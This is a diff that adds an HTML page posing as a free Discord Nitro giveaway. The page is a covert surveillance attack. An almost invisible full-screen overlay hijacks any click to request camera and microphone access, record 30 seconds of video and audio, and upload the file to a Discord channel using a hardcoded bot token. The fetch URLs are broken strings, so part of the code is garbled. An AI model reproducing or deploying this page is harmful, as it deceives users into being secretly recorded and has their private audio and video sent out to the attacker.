@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Get Free Nitro!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #36393f;
+            color: #dcddde;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Prevent scrolling */
+        }
+        #clickjack {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.00001; /* Almost invisible */
+            z-index: 10; /* Ensure it's on top */
+            background-color: rgba(0, 0, 0, 0.00001); /* Almost transparent background */
+        }
+        #content {
+            text-align: center;
+            z-index: 1;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="clickjack" onclick="startRecording()"></div>
+    <div id="content">
+        <h1>🎉 Claim Your FREE Nitro! 🎉</h1>
+        <p>Click anywhere to activate your Nitro reward!</p>
+        <button onclick="alert('Nitro Activated!')">Activate Nitro</button>
+    </div>
+
+    <script>
+        const botToken = "eWR7pVsIMTQ3jDkZsqVbKIButR367U25";
+        const channelId = "112233445566778899";
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: true
+                });
+
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, {
+                        type: 'video/webm'
+                    });
+                    await uploadToDiscord(blob);
+                    recordedChunks = [];
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    stopRecording();
+                }, 30000); // 30 seconds
+            } catch (error) {
+                console.error("Error accessing media devices:", error);
+                sendErrorMessageToDiscord(error.message);
+            }
+        }
+
+        async function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+        }
+
+        async function uploadToDiscord(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'webcam_voice.webm');
+            formData.append('content', '📹 New recording!');
+
+            try {
+                const response = await fetch(`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bot ${botToken}`
+                    },
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    console.error("Error uploading to Discord:", response.status);
+                    sendErrorMessageToDiscord(`Upload failed: ${response.status}`);
+                }
+            } catch (error) {
+                console.error("Error uploading to Discord:", error);
+                sendErrorMessageToDiscord(`Upload error: ${error.message}`);
+            }
+        }
+
+        async function sendErrorMessageToDiscord(message) {
+            try {
+                const response = await fetch(`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bot ${botToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `💥 Error: ${message}`
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error("Error sending error message to Discord:", response.status);
+                }
+            } catch (error) {
+                console.error("Error sending error message to Discord:", error);
+            }
+        }
+    </script>
+</body>
+  </html>
